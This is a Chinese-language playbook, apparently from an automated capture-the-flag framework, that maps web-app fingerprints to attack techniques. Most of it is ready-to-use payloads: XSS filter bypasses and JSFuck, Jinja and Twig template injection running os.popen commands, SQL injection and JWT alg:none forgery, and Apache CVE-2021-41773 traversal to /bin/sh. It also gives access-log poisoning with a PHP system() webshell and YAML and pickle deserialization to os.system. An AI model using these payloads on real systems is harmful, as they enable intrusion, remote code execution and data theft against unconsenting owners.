# 指纹 → 打法对照表

> 用法：`framework.recon.fingerprint()` 给出 families，按表直接跳对应 play。
> 只写"可复用"的判断依据，不记录任何具体题目/flag。
>
> **先查真实战例**：`docs/CASELIB/INDEX.md` 是按族归档的实战记录（指纹、打法链、原始报错），
> 本表是抽象规约，CASELIB 是落地样本。两者对不上时，先信 CASELIB 里能复现的那条。

## 1. Dalgona 系 XSS（标题含 Dalgona，页面回显 alert 结果）

服务端用无头浏览器执行你的 payload 并回报 `alert` 的参数。**先读回显**，它会告诉你哪里失败：

- `You did an alert with TypeError: Attempting to change the setter of an unconfigurable property`
  → 你的 payload **没执行**（不是 payload 被过滤，是语法/上下文问题），换上下文变体。
- `Sorry you can't use: 'alert'` → 服务端字面量黑名单。

按**反射上下文**选载荷（顺序即推荐尝试序）：

| 上下文 | 首选载荷 |
|---|---|
| HTML 文本 | `<svg onload=alert('XSS')>` |
| 属性 `value="..."` | `" autofocus onfocus="alert(`XSS`)"` |
| `<script>` 字符串 | `";alert('XSS');//` |
| iframe src / URL | `data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=` |
| 过滤 `alert` | `window["al"+"ert"]("XSS")` |
| 过滤 `XSS` 字面量 | `alert(String.fromCharCode(88,83,83))` |
| 过滤 `<` `(` | HTML 实体 `alert&#40;'XSS'&#41;` |
| 过滤空格 | `<svg/onload=alert(`XSS`)>` 或 `<svg onload=alert('XSS')`（不闭合标签） |
| 标签黑名单（含 script/img/svg/…） | `<body onload=alert("XSS")>` |
| 黑名单正则 `[a-yA-Y/]`（剩 z） | `<z onfocus=alert('XSS') autofocus>` |
| 字母数字全禁 | 纯标点 JSFuck：见下方"字符构造" |

**JSFuck 字符构造表**（字母全禁时唯一出路，按需取字符）：

```
"false"[1]        -> a
"false"[2]        -> l
"true"[0]         -> t
"undefined"[4]    -> f
"undefined"[5]    -> i
"undefined"[1]    -> n
"Infinity"[3]     -> i
"[object Object]"[1] -> o
document.location -> 提供 p/r/c
```

`alert` 用 `[]["sort"]["constructor"]("alert(1)")()` 拿 Function 构造器绕开关键字。

## 2. Django SSTI（`{{7|add:7}}` 生效，`{{7*7}}` 报 TemplateSyntaxError）

Django 表达式**不能**用 jinja 的 `__globals__` 链（变量/属性不能以下划线开头），
但有两个大杀器：

1. `{% debug %}` —— 直接 dump 全部 context。**很多题 flag 就在 context 里**，一步到位。
2. 无下划线信息泄露：`{{messages.storages.0.signer.key}}`、`{{request.META}}`。

需要报错信息时：`DEBUG=True` 的 traceback 会给出源码行号、路由、settings，比爆破快得多。

## 3. Jinja / Twig / ERB（`{{7*7}}` 返回 49）

```
Jinja : {{lipsum.__globals__['os'].popen('cat /flag').read()}}
        {{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
Twig  : {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag')}}
ERB   : <%= File.read('/app/flag.txt') %>
```

过滤了下划线/花括号时：`{% set a='__' %}` + `|attr()` 拼装，或 `%c` 生成字符；
过滤关键字时优先换"函数入口"（`lipsum`/`cycler`/`config`/`self`），不要硬怼同一个。

## 4. FastAPI 类业务应用（`/openapi.json` 可读）

先看 openapi 列全部路由——**这题的路由表就是攻击面清单**。三个高频洞：

| 现象 | 洞 | 打法 |
|---|---|---|
| `/jobs` 接受 `job_type` 字符串 | SQLi | `{"job_type":"private'--"}` 直接读出被隐藏的行 |
| 有 `demo/demo` 提示 + `POST /system_config/{id}` 或 `/manage_settings/{id}` | Mass Assignment | `name=x&is_admin=1`，再回列表页找新增内容 |
| cookie 形如 `access_token="Bearer MQ=="` | 弱 token | `MQ==`→`Mg==`/`Mw==`（base64 的 id）直接越权 |
| cookie 是 JWT | 不验签 / `alg:none` | 改 `sub`/`user_id` 保留原签名；或 alg=none 空签名 |

## 5. PHP / Apache 组合

- `/static/` 能列目录 → 看有没有被 403 的 flag 文件 → 用应用自己的读文件接口
  （`/resource?filename=flag` 这类）绕开 Apache 的 `<Files>` 规则。
- `.htaccess` 只 deny 了 GET/POST → 试 `PUT` 直接写/执行。
- `strcmp($a,$b)` 比较密码 → `password[]=x` 传数组。
- 弱比较 `==` → magic hash（`240610708` 之类）或 `password=true`。
- Apache 2.4.49/2.4.50 → CVE-2021-41773 / 42013（`/.%2e/` 双重编码 → `/cgi-bin/.../bin/sh`）。
- 上传：只判扩展尾串时用 `shell.php.jpg`/`shell.pdf.php`；只判 Content-Type 时伪造 `image/gif`；
  拿到 shell 后统一先 `cat /FLAG.txt /flag /flag.txt /app/flag.txt`。
- LFI 绕过顺序替换：`...././/` （`../` 和 `./` 各被替换一次后仍残留 `../`）。
- 无文件读取点时用 **access.log 投毒**（UA 里写 `<?php system($_GET[0]);?>`，**别带引号**，
  否则日志里被转义成 `\"` 造成永久语法错误，只能重启容器）。

## 6. 授权类（最常见、最便宜）

| 现象 | 打法 |
|---|---|
| `/company/1/jobs` 可以，`/company/2/jobs` 401 | 枚举 id / 伪造 token / 找 sub 可控点 |
| 表单里有隐藏 `is_admin=false` / `role=user` | 直接改成 `true`/`admin` |
| 登录接口收 `user_id` 字段 | IDOR：先 GET 目标用户的资料页，里面通常有 hidden user_id |
| `change_password.php?userId=` | 改别人密码（admin）后用新密码登录 |
| 头里带 `X-UserId` / `X-Forwarded-For` | 直接改；127.0.0.1 常用于绕过 localhost-only |
| 会话是 `base64("id")` | 换 id 即可 |

## 7. 反序列化 / 注入类

- **YAML** cookie → `!!python/object/apply:os.system ["..."]`
- **pickle** → `__reduce__` 返回 `(os.system, (cmd,))`；注意必须是"对象"而不是裸 tuple
- **PHP** → `phar://` 触发（路径前加 `//` 常能绕过 `file_exists` 检查）
- **XXE** → SOAP / SVG 上传 / `/addbook`，`file:///app/flag.txt`
- **GraphQL** → 未授权 query + 参数拼 SQL / NoSQL（`search: "{\"username\":\"admin\"}"`）

## 8. 概率/窗口类：竞态（TOCTOU）

判据：代码里"先读 A → 耗时校验 → 再读 A"，且中间允许别的请求写入。
单发成功率 = 1/(worker 数) × 时间对齐概率，通常 <1% → **必须用并发编排**，
见 `framework/race.py` 与 `docs/PITFALLS.md#竞态`。
